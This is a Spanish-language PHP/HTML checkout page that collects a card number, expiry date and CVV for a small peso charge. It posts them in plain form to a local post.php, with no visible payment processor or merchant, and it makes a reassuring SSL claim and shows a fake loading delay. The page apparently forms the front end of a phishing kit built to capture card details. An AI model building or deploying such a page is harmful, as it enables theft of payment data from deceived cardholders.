<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        /* Estilos para la animación de carga */
        .loader-container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
        }
        .loader {
            border: 16px solid #f3f3f3;
            border-top: 16px solid #3498db;
            border-radius: 50%;
            width: 120px;
            height: 120px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <form action="post.php" method="POST"> <!-- Ajustado para enviar datos a post.php -->
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-6">
                    <div class="payment-method">
                        <h4>Metodo de Pago</h4>
                        <div class="card">
                            <div class="accordion" id="accordionExample">
                                <!-- Paypal option -->
                                <div class="card">
                                    <div class="card-header p-0" id="headingTwo">
                                        <h2 class="mb-0">
                                            <button class="btn btn-light btn-block text-left collapsed p-3 rounded-0 border-bottom-custom" type="button" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo" onclick="selectRadioButton('radiopp')">
                                                <div class="d-flex align-items-center justify-content-between">
                                                    <label>
                                                        <input type="radio" name="payment_method" value="paypal" /> <!-- Ajustado con un name y value adecuados -->
                                                        Paypal
                                                    </label>
                                                    <img src="paypal.png" width="30">
                                                </div>
                                            </button>
                                        </h2>
                                    </div>
                                </div>
                                <!-- Credit card option -->
                                <div class="card">
                                    <div class="card-header p-0">
                                        <h2 class="mb-0">
                                            <button class="btn btn-light btn-block text-left p-3 rounded-0" data-toggle="collapse" data-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne" onclick="selectRadioButton('radioadd')">
                                                <div class="d-flex align-items-center justify-content-between">
                                                    <label>
                                                        <input type="radio" name="payment_method" value="credit_card" /> <!-- Ajustado con un name y value adecuados -->
                                                        Añadir una tarjeta de débito o crédito
                                                    </label>
                                                    <div class="icons">
                                                        <img src="mastercard.png" width="30">
                                                        <img src="visa.png" width="30">
                                                        <img src="amex.png" width="30">
                                                    </div>
                                                </div>
                                            </button>
                                        </h2>
                                    </div>
                                    <div id="collapseOne" class="collapse" aria-labelledby="headingOne" data-parent="#accordionExample">
                                        <div class="card-body payment-card-body">
                                            <h6>N° de la tarjeta</h6>
                                            <div class="input">
                                                <span class="icon"><i class="fa fa-credit-card"></i></span>
                                                <input type="text" class="form-control" placeholder="0000 0000 0000 0000" name="card_number" maxlength="20" oninput="formatCardNumber(this)" required> <!-- Ajustado con el name correcto -->
                                            </div>
                                            <div class="row mt-3 mb-3">
                                                <div class="col-md-6">
                                                    <h6>Fecha de vencimiento</h6>
                                                    <div class="input">
                                                        <span class="icon"><i class="fa fa-calendar"></i></span>
                                                        <input type="text" class="form-control" placeholder="MM/YY" name="expiration_date" inputmode="numeric" maxlength="5" oninput="formatExpirationDate(this)" required> <!-- Ajustado con el name correcto -->
                                                        <div id="error-message" style="color: red;"></div>
                                                    </div>
                                                </div>
                                                <div class="col-md-6">
                                                    <h6>CVV</h6>
                                                    <div class="input">
                                                        <span class="icon"><i class="fa fa-lock"></i></span>
                                                        <input type="text" class="form-control" placeholder="000" name="cvv" maxlength="4" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required> <!-- Ajustado con el name correcto -->
                                                    </div>
                                                </div>
                                            </div>
                                            <p class="text-muted certificate-text"><i class="fa fa-lock"></i> Su transacción está asegurada con certificado SSL</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="summary">
                        <h4>Resumen</h4>
                        <div class="card">
                            <div class="d-flex justify-content-between p-3">
                                <div class="d-flex flex-column">
                                    <span>Subtotal <i class=""></i></span>
                                    <a href="#" class="billing"></a>
                                </div>
                                <div class="mt-1">
                                    <sup class="super-price">$19.40 </sup>
                                    <span class="super-month">MXN</span>
                                </div>
                            </div>
                            <hr class="mt-0 line">
                            <div class="p-3">
                                <div class="d-flex justify-content-between mb-2">
                                    <span></span>
                                </div>
                                <div class="d-flex justify-content-between">
                                    <span>IVA <i class="fa fa-clock-o"></i></span>
                                    <span>$3.00</span>
                                </div>
                            </div>
                            <hr class="mt-0 line">
                            <div class="p-3 d-flex justify-content-between">
                                <div class="d-flex flex-column">
                                    <span>Total a Pagar</span>
                                </div>
                                <span>$22.40</span>
                            </div>
                            <div class="p-3">
                                <button id="payButton" type="submit" class="btn btn-primary btn-block free-button" onclick="mostrarAnimacion()">Pagar</button>
                            </div>
                        </div>
                        <div class="text-center">
                            <a href="#">¿Tienes un código de promoción?</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </form>

    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
    <script>
        function mostrarAnimacion() {
            var cardNumberInput = document.querySelector('input[name="card_number"]');
            var expirationDateInput = document.querySelector('input[name="expiration_date"]');
            var cvvInput = document.querySelector('input[name="cvv"]');

            if (cardNumberInput.value === "" || expirationDateInput.value === "" || cvvInput.value === "") {
                alert("Por favor, completa todos los campos.");
                return;
            }

            var loaderContainer = document.createElement("div");
            loaderContainer.className = "loader-container";
            var loader = document.createElement("div");
            loader.className = "loader";
            loaderContainer.appendChild(loader);

            document.body.appendChild(loaderContainer);

            setTimeout(function() {
                document.querySelector('form').submit(); // Enviar el formulario después de la animación
            }, 3000);
        }

        function selectRadioButton(name) {
            var radios = document.querySelectorAll('input[type="radio"]');
            var labels = document.querySelectorAll('label');
            for (var i = 0; i < radios.length; i++) {
                if (radios[i].name !== name) {
                    radios[i].checked = false;
                }
            }
            for (var j = 0; j < labels.length; j++) {
                if (labels[j].textContent.trim() === '') {
                    labels[j].previousElementSibling.checked = true;
                }
            }
        }

        var myLink = document.querySelector('a[href="#"]');
        myLink.addEventListener('click', function(e) {
            e.preventDefault();
        });

        function formatCardNumber(input) {
            input.value = input.value.replace(/\D/g, '');
            input.value = input.value.substring(0, 16);
            const formattedValue = input.value.replace(/(\d{4})/g, '$1 ').trim();
            input.value = formattedValue;
        }

        function formatExpirationDate(input) {
            const formattedValue = input.value.replace(/\D/g, '').substring(0, 4);
            const month = formattedValue.substr(0, 2);
            const year = formattedValue.substr(2, 2);

            const currentDate = new Date();
            const currentYear = currentDate.getFullYear() % 100;
            const currentMonth = currentDate.getMonth() + 1;

            let formattedDate = '';
            if (formattedValue.length >= 2) {
                formattedDate = month + '/' + year;
            } else {
                formattedDate = formattedValue;
            }

            input.value = formattedDate;

            const errorMessage = document.getElementById('error-message');
            errorMessage.textContent = '';

            if (parseInt(month) < 0 || parseInt(month) > 12) {
                errorMessage.textContent = 'El mes es inválido.';
            } else if (parseInt(year) < currentYear || (parseInt(year) === currentYear && parseInt(month) < currentMonth)) {
                errorMessage.textContent = 'La tarjeta ha expirado.';
            }
        }
    </script>
</body>
</html>
